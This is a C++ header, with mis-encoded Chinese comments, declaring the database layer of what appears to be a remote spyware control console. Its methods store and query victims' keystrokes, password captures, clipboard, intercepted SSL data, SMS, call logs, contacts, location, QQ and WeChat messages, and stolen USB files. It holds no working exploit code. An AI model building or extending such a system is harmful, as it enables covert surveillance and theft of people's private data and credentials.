/*
	Description : ���ݿ������
	Author		: Ruining Song
	Date		: 2013.11.11
	Remark		:
*/

#ifndef DATABASEMANAGER_H
#define DATABASEMANAGER_H

#include <QtSql>
#include <QtGui>
#include "pagetablewidget.h"
#include "Target.h"
#include "Utility.h"

#include <string>
#include <list>

class DatabaseManager : public QObject
{
	
	Q_OBJECT

signals:
	void emitCalInfoFinished(bool);

	void emitLogDetailInfoFinished(unsigned int);
	void emitLogDownloadInfoFinished(unsigned int);
	void emitLogUploadInfoFinished(unsigned int);
	void emitLogPluginInfoFinished(unsigned int);

	void emitKeyboardInfoFinished(unsigned int);

	void emitAppRecordCount(int count);
	void emitAppCurrentRecordAdd();
	void emitAppExportFinished();
	void emitAppExportCanceled();

public:

	// ���캯��
	DatabaseManager(std::wstring connStr, std::wstring User = L"", std::wstring Password = L"");

	// ��������
	~DatabaseManager();

public slots:

	////////////////////////////////////////////

	// ��ѯĿ���б�
	void QueryTargetList();

	// ���Ŀ��
	void AddTarget(Target *tar);

	// ����Ŀ����Ϣ
	void UpdateTargetInfo(Target *tar);

	// ����Ŀ����Ϣ
	void UpdateTargetExInfo(Target *tar);

	// ��ѯĿ�����Ƿ�����
	DWORD QueryTargetPluginStatus(DWORD targetId);

	// �޸�Ŀ��������״̬
	void UpdatetargetPluginStatus(DWORD targetId, DWORD status);

	// Ŀ���Ƿ��ղ�
	void UpdateTargetFavoriteStatus(DWORD targetId, bool status);

	// ��ѯĿ�������Ƿ��Զ���ȡĿ¼��Ϣ -1 - ����ȡ 0 - ��ȡȫ�� ���� - ��ȡ����
	int QueryTargetAutoGetStatus(DWORD targetId);

	// Ŀ�������Ƿ��Զ���ȡĿ¼��Ϣ -1 - ����ȡ 0 - ��ȡȫ�� ���� - ��ȡ����
	void UpdateTargetAutoGetStatus(DWORD targetId, int depth);

	// ���Ŀ��
	void ClearAndRemoveTarget(ULONG targetId);

	// ���Ŀ�������¼
	void ClearTargetHistoryTask(ULONG targetId);

	/////////////////////////////////////////////
	
	// ����Ŀ������б�
	void AddTargetLogicDriver(ULONG  targetId, DriverSet &logDriver);

	// ��ѯĿ������б�
	int  QueryTargetLogicDriver(ULONG targetId, DriverSet &logDriver);

	//////////////////////////////////////////////

	// ��ѯĿ�����б�
	void QueryTargetPluginList(ULONG targetId, PPLUGIN_CONTEXT PlgContext[MAX_PLG_COUNT]);

	// ��ѯĿ���Ƿ����ָ�����
	bool TargetPluginIsExisted(ULONG targetId, ULONG  pluginId);

	// ����Ŀ������Ϣ
	void UpdateTargetPluginInfo(ULONG targetId, PPLUGIN_CONTEXT lpPlgContext);

	// ����Ŀ������Ϣ
	void InsertTargetPluginInfo(ULONG targetId, PPLUGIN_CONTEXT lpPlgContext);

	//////////////////////////////////////////////

	// ��ѯ��־��Ϣ
	void QueryLogInfo(ULONG targetId, PageTableWidget* table);

	// Used by "QueryLogInfo"
	void AddFakeRow(
		bool online,
		QTableWidgetItem* time, 
		QTableWidgetItem* status,
		QTableWidgetItem* publicIp,
		QTableWidgetItem* localIp,
		QTableWidgetItem* macAddress,
		QTableWidgetItem* proc,
		QTableWidgetItem* user,
		PageTableWidget* table);

	// ��ѯϸ����־��Ϣ
	void QueryLogDetailInfo(unsigned int targetId, PageTableWidget* table);

	// ��ѯ������־��Ϣ
	void QueryLogDownloadInfo(unsigned int targetId, PageTableWidget* table);

	// ��ѯ�ϴ���־��Ϣ
	void QueryLogUploadInfo(unsigned int targetId, PageTableWidget* table);

	// ��ѯ����ش���־��Ϣ
	void QueryLogPluginInfo(unsigned int targetId, PageTableWidget* table);

	// ����Ŀ����־��Ϣ
	void InsertTargetLogInfo(ULONG targetId,
							const char  *status,
							const char  *lastTime,
							const char  *remLocalIpAddr,
							const char  *remPublicIpAddr,
							const char  *remMacAddr,
							const char  *lpOnlineProcBase64,
							const char  *lpLoginUserBase64);

	// ����ϸ����־��Ϣ
	void InsertLogDetailInfo(ULONG targetId, std::wstring time, std::wstring content);

	// ��Ŀ��Ŀ¼��Ϣ���
	void AddOfflineDirInfo(Target		*tarBlock,
						   std::string		timeStr,
					       const char	*lpszdirPath,
						   const char	*lpszdirData);

	// ��ѯ�ϴ�Ŀ��Ŀ¼��Ϣ
	int QueryLastOfflineDirInfo(ULONG        targetId,
								const char   *lpszbase64Path,
								std::string      &dirTime,
								std::string      &dirData,
								int          *lpnId=NULL);

	// ����첽������Ϣ
	void AddAsyncSearchInfo(ULONG       targetId,
							std::string		searchDirPathBase64,
							DWORD       dwLevel,
							DWORD       dwMinSize,
							DWORD       dwMaxSize,
							FILETIME    ftBegTime,
							FILETIME    ftEndTime,
							std::string		aniNameFilterBase64,
							std::string		aniTypeFilterBase64,
							PCHAR       lpData);

	// ��ѯĿ¼���ص���ʷ��¼
	void QueryDirDownDetail(ULONG targetId, ULONG parentId, QTableWidget* table);

	// ��ѯ������ݻش���¼
	void QueryPluginData(ULONG targetId, QTableWidget* table);

	//////////////////////////////////////////////

	// ��� usb ����
	void AddUsbOperation(ULONG			targetId,
						 ULONG			usbId,
						 std::wstring	driver,
						 const char *	lpszInTime,
						 const char *	lpszOutTime);

	// ��ѯ usb ����
	int QueryUSBOpCount(ULONG dwTargetId);

	// ��ѯ usb ����
	int QueryUSBOpData(ULONG dwTargetId, QTableWidget* table);

	// ���� usb �ļ�
	void AddUsbFile(ULONG		targetID,
					std::string		base64Path,
					char*		lpszThiefTIme,
					ULONG		dwFileSize,
					char		*lpszLwTIme);

	// ���� usb �ļ�
	int  QueryUsbFile(ULONG targetID, QTableWidget* table);

	// ���� usb Ŀ¼��Ϣ
	void AddUsbDirInfo(ULONG       targetId,
					   ULONG       usbId,
					   const char  *lpszInTime,
					   const char  *dirPath,
					   const char  *dirData);

	// ���� usb Ŀ¼
	int  QueryUsbDir(ULONG		targetID,
					std::string	aniTime,
					std::string	base64Path,
					std::string	&dirData);

	// usb Ŀ¼�Ƿ����
	bool UsbDirIsExisted(ULONG  targetId,
						std::string  aniTime,
						std::string  base64Path);


	/////////////////////////////////////////////

	//
	// �ļ��м�� ���˽ӿ���������
	//

	// �����ص��ļ���
	void InsertTargetMonitorDir(
		unsigned int targetId, 
		unsigned int taskId, 
		std::wstring dirPath, 
		std::wstring monitorTime, 
		std::wstring remark,
		bool isDir);

	// ��ѯ��ص��ļ���
	void QueryTargetMonitorDir(unsigned int targetId, MonitorDirMap& dirMap);

	// ɾ����ص��ļ���
	void DeleteTargetMonitorDir(unsigned int taskId);

	// �����ص��ļ��б�
	// info ���Ѿ����ļ�����������б�
	void InsertTargetMonitorFile(unsigned int targetId, unsigned int taskId, MonitorFileInfoList& info);

	// ��ѯ��ص��ļ��б�
	// ��ѯ�����ӳ�� info ��
	void QueryTargetMonitorFile(unsigned int targetId, unsigned int taskId, MonitorFileInfoList& info);

	// ɾ����ص��ļ��б�
	void DeleteTargetMonitorFile(unsigned int taskId);

	// �����ļ��䶯��¼
	void InsertTargetMonitorFileRecord(
		unsigned int taskId, 
		std::wstring fileName, 
		std::wstring fileChangeType, 
		std::wstring fileChangeTime, 
		std::wstring remark);

	// ��ѯ�ļ��䶯��¼
	void QueryTargetMonitorFileRecord(unsigned int taskId, QTreeWidgetItem* parent);

	// ɾ���ļ��䶯��¼
	void DeleteTargetMonitorFileRecord(unsigned int taskId);

	//////////////////////////////////////////////

	// ��鲢�����ļ�����
	void CheckAndInsertFileTask(FileTask *lpFileTask, const char *ctrPathBase64, const char *tarPathBase64);

	// �����ļ�����
	void InsertFileTask(FileTask *lpFileTask,  const char *ctrPathBase64, const char *tarPathBase64);

	// �����ļ���Ϣ����
	void InsertDirInfoTask(DirTask *lpDirTask, const char *tarPathBase64);

	// �����ļ���������
	void InsertDirDownTask(DirTask *lpDirTask, const char *tarPathBase64);

	// �����ļ���������
	void InsertSearchTask(SearchTask *lpSearchTask,
						  const char *tarPathBase64,
						  const char *nameBase64,
						  const char *typeBase64);

	// ���Ŀ¼����
	bool  CheckDirTask(DWORD dwTargetId, std::wstring wDirPath, PFILE_BLOCK lpFileBlock);

	// ����ļ�����
	DWORD CheckFileTask(DWORD dwTargetId, std::wstring wFilePath, PFILE_BLOCK lpFileBlock);
/*
	// �����ļ��ϴ�����
	DWORD QueryFileUpTask(int            nPageDirect,
						  DWORD          dwTargetId,
						  TTntListView   *tntlv,
						  PDWORD         lpdwLeftId,
						  PDWORD         lpdwRightId);

	// �����ļ���������
	DWORD QueryFileDownTask(int             nPageDirect,
							DWORD           dwTargetId,
							TTntListView    *tntlv,
							PDWORD          lpdwLeftId,
							PDWORD          lpdwRightId);

	// ����Ŀ¼��������
	DWORD QueryDirDownTask(int            nPageDirect,
						   DWORD          dwTargetId,
						   TTntListView   *tntlv,
						   PDWORD         lpdwLeftId,
						   PDWORD         lpdwRightId);

	// ����Ŀ¼��ϸ��Ϣ��������
	DWORD QueryDirDownDetailTask(DWORD           dwTargetId,
								 DWORD           dwDirTaskId,
								 TTntListView    *tntlv);

	// ��ѯĿ¼��Ϣ����
	DWORD QueryDirInfoTask(int            nPageDirect,
						   DWORD          dwTargetId,
						   TTntListView   *tntlv,
						   PDWORD         lpdwLeftId,
						   PDWORD         lpdwRightId);

	// ��ѯ��������
	DWORD QuerySearchTask(int            nPageDirect,
						  DWORD          dwTargetId,
						  TTntListView   *tntlv,
						  PDWORD         lpdwLeftId,
						  PDWORD         lpdwRightId);

	// ��ѯ�����Ϣ����
	DWORD QueryPlgDataTask(int            nPageDirect,
						   DWORD          dwTargetId,
						   TTntListView   *tntlv,
						   PDWORD         lpdwLeftId,
						   PDWORD         lpdwRightId);

	// ��ѯ�����������
	DWORD QueryPlgUptTask(int            nPageDirect,
						  DWORD          dwTargetId,
						  TTntListView   *tntlv,
						  PDWORD         lpdwLeftId,
						  PDWORD         lpdwRightId);
*/
	//////////////////////////////////////////////

	// �������ִ����Ϣ
	void InsertPEIInfo(ULONG		targetId,
					   long			execTime,
					   std::wstring		procName,
					   ULONG		procId,
					   std::wstring		cmdLine);

	// ������̼�¼��Ϣ
	void InsertIMEInfo(ULONG        targetId,
					   long         time,
					   std::wstring      procName,
					   ULONG        processId,
					   std::wstring      captionName,                                  
					   std::wstring      content);

	// ���������¼��Ϣ
	void InsertPWIInfo(ULONG        targetId,
					   long         time,
					   std::wstring      procName,
					   ULONG        procId,
					   std::wstring      caption,
					   std::wstring      content);

	// ����������¼
	void InsertCBDInfo(ULONG        targetId,
					   long         time,
					   std::wstring      procName,
					   ULONG        procId,
					   std::wstring      content);

	// �����ļ�������¼
	void InsertFOIInfo(ULONG        targetId,
					   long         opTime,
					   std::wstring		procName,
					   ULONG        procId,
					   FileOpType   opType,
					   std::wstring		srcFileName,
					   std::wstring		dstFileName);

	// ���� SSL ��Ϣ
	int InsertSSLInfo(ULONG         targetId,
					  const char    *lpsztime,
					  DWORD         hKey,
					  std::wstring		procName,
					  DWORD         procId,
					  DWORD         threadId,
					  DWORD         packageType,
					  int           encryptFlag,
					  DWORD         passFlag,
					  DWORD         finalFlag,
					  const char   *host,                                  
					  const char   *data,
					  ULONG         dataLen);

	// ���� SMS ��Ϣ
	int InsertSMSInfo(ULONG			targetId,
					  std::wstring	date,
					  LONG			type,
					  std::wstring	address,
					  std::wstring	message);

	// ��� SMS ��Ϣ
	void ClearSMSInfo(ULONG targetID);

	// ���� CAL ��Ϣ
	int InsertCALInfo(ULONG			targetId,
					  std::wstring	date,
					  LONG			type,
					  std::wstring	address,
					  LONG			duration);

	// ��� CAL ��Ϣ
	void ClearCALInfo(ULONG targetID);

	// ���� CONTACT ��Ϣ
	void InsertCONTACTInfo(ULONG targetID, std::wstring name, std::wstring phone, std::wstring remark);

	// ��� CONTACT ��Ϣ
	void ClearCONTACTnfo(ULONG targetID);

	// ���� location ��Ϣ
	void InsertLocationInfo(ULONG targetID, std::wstring time, std::wstring locationX, std::wstring locationY, std::wstring remark);


	// ��ѯ SSL ��Ϣ
	void  QuerySSLInfo(ULONG targetId, QTreeWidget* tree);

	// ��ѯ SSL ����
	//TMemoryStream* QuerySSLData(int httpsId);

	//////////////////////////////////////////////

	// ��ѯ�ļ�������¼����
	int QueryUserFOIData(ULONG          dwTargetId,
						 PCHAR          opType,
						 QTableWidget*	table);


	// ��ѯ���̼�¼����
	int QueryIMEData(unsigned int dwTargetId, PageTableWidget* table);


	// ��ѯ�����¼����
	int QueryPWIData(ULONG dwTargetId, QTableWidget* table);

	// ��ѯ�������¼����
	int QueryCBDData(ULONG dwTargetId, QTableWidget* table);

	// ��ѯ����ִ�м�¼����
	int QueryPEIData(ULONG dwTargetId, QTableWidget* table);

	// ��ѯ�ļ�������¼����
	int QueryFOIData(ULONG dwTargetId, QTableWidget* table);

	// ��ѯ���ż�¼
	int QuerySMSData(ULONG dwTargetId, QTableWidget* table);

	// ��ѯͨ����¼
	int QueryCALData(unsigned int dwTargetId, QTableWidget* table);

	// ��ѯͨѶ¼
	int QueryCONTACTData(unsigned int dwTargetId, QTableWidget* table);

	// ��ѯ location ��Ϣ
	void QueryLocationInfo(ULONG targetID, QTableWidget* table);

	////////////////////////////////////////////////

	// �����ļ���ؼ�¼
	void InsertFileMonitorRecord(ULONG dwTargetId,
								 std::wstring recordName, 
								 std::wstring recordPath, 
								 std::wstring recordTime);

	// ����ļ���ؼ�¼
	void CleanFileMonitorRecord(ULONG dwTargetId, std::wstring recordPath);

	// �����ļ�����б�
	void InsertFileMonitorList(ULONG dwTargetId, 
							   std::wstring fileName, 
							   std::wstring filePath, 
							   std::wstring fileTime, 
							   std::wstring fileType, 
							   ULONG isDir);

	// ȡ������ļ�
	void RemoveFileMonitorList(ULONG dwTargetId, std::wstring path);

	bool QueryFileItemMonitored(ULONG targetId, std::wstring filePath);

	// ��ѯ�ļ���ؼ�¼
	void QueryFileMonitorRecord(ULONG dwTargetId, QTreeWidget* tree);

	// ��ѯ�ļ�����б�
	void QueryFileMonitorList(ULONG dwTargetId, QTreeWidget* tree);

	// ��ѯ�ļ���ؼ�¼����
	int GetFileRecordCount(ULONG dwTargetId, std::wstring path);

	// QQ���

	bool QQAccountExist(ULONG dwTargetId, std::wstring qqNumber);

	void InsertQQAccount(ULONG dwTargetId, std::wstring qqNumber);

	bool QQFriendExist(ULONG dwTargetId, std::wstring owner, std::wstring number);

	void InsertQQFriend(
		ULONG dwTargetId, 
		std::wstring owner, 
		std::wstring number, 
		std::wstring nickName, 
		std::wstring remark, 
		std::wstring signature,
		std::wstring group);

	bool QQTroopExist(ULONG targetId, std::wstring owner, std::wstring number);

	void InsertQQTroop(
		ULONG targetId,
		std::wstring owner,
		std::wstring number,
		std::wstring troopName,
		std::wstring troopMemo);

	// �����ϢΪͼƬ���������� content �洢·��
	void InsertQQMessage(
		ULONG dwTargetId,
		std::wstring owner,
		int type,
		std::wstring containerNumber,
		std::wstring senderNumber,
		std::wstring senderNickName,
		std::wstring time,
		int msgType,
		std::wstring content);


	// ΢�����

	bool WeixinAccountExist(ULONG dwTargetId, std::wstring weixinId);

	void InsertWeixinAccount(
		ULONG dwTargetId,
		std::wstring weixinId,
		std::wstring nickName);

	bool WeixinFriendExist(ULONG dwTargetId, std::wstring weixinId, std::wstring friendId);

	void InsertWeixinFrineds(
		ULONG dwTargetId,
		std::wstring weixinId,
		std::wstring friendId,
		std::wstring nickName);

	void InsertWeixinMessage(
		ULONG dwTargetId,
		std::wstring weixinId,
		std::wstring friendId,
		std::wstring senderId,
		std::wstring time,
		int type,
		std::wstring content
		);

	void CleanAppData(ULONG targetId);

	// ���������¼���
	void StartExportAppRecord(QString path, int targetId);
	void CancelExportAppRecord();

	////////////////////////////////////////////////////////////////////

	// ��ѯ�����ؼ���Ӫ��
	void GetLocationFromPhoneNumber(
		const std::wstring& phoneNumber, 
		std::wstring& location,
		std::wstring& netService);

	// ������ݿ�
	void CleanDatabase();

	// ���Ŀ������
	void CleanTargetData(ULONG targetId);

	// ������
	void UnitTest();

	// ����
	inline void Lock() { EnterCriticalSection(&csGui); }

	// ����
	inline void Unlock() { LeaveCriticalSection(&csGui); }

private:    

	//
	// �ؼ�����
	//
	CRITICAL_SECTION  csGui;                        // �������߳�ר��(ֻ��һ��)
	CRITICAL_SECTION  csControlConn;                // ConnThreadר��(ֻ��һ��)
	CRITICAL_SECTION  csTarConn;                    // Ŀ���߳�ר�ã��ж���̣߳�
	CRITICAL_SECTION  csPlgData;                    // ����������

	QSqlDatabase db;

	// ȡ�����������¼ flag
	HANDLE m_hExport;
};

extern DatabaseManager* DM;

#endif // DATABASEMANAGER_H